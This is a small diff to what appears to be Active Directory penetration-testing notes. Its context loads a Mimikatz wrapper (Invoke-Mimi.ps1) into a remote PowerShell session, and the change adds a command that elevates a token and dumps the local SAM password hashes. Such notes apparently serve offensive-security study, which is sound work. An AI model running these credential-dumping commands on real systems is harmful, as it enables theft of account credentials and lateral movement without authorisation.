@@ -470,5 +470,5 @@ Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
 Enter-PSSession -Session $sess
 ```
 ```powershell
-Enter-PSSession -Session $sess
+Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 ```
